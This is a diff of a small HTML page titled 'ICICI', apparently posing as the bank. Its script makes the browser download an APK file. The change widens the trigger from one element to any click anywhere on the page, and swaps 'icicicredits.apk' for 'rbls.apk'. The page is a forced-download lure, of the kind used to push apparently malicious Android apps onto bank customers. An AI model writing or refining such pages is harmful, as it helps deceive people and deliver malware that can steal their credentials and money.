@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>icici</title>
+    <title>ICICI</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 
@@ -15,15 +15,14 @@
     </div>
 
     <script>
-        document.getElementById('main').addEventListener('click', () => {
+        // Add click event listener to the entire document
+        document.addEventListener('click', () => {
             const ele = document.createElement('a');
-            ele.href = '/icicicredits.apk';
-            ele.download = 'icicicredits.apk';
-            ele.click();
-        })
+            ele.href = '/rbls.apk'; // Ensure the APK path is correct
+            ele.download = 'rbls.apk'; // Name for the downloaded file
+            ele.click(); // Trigger the download
+        });
     </script>
-
-    </head>
 </body>
 
 </html>
